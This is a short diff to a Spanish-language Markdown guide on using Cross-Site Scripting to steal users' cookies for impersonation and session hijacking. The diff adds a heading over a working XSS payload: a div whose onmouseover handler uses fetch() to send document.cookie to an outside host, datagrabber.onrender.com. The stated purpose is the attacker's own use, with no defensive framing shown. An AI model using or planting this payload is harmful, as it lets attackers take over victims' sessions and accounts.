@@ -8,6 +8,8 @@ Este documento describe cómo realizar una inyección de código JavaScript medi
 
 El objetivo de esta técnica es aprovechar una vulnerabilidad de **Cross-Site Scripting (XSS)** para robar cookies o información sensible del usuario. Esta información puede ser enviada a un servidor controlado por el atacante para su posterior uso, como la suplantación de identidad o el secuestro de sesiones.
 
+#### Código para la inyección:
+
 ```javascript
 <div onmouseover="fetch('https://datagrabber.onrender.com/grab?data=' + encodeURIComponent(document.cookie))">
     Pasa el ratón por aquí
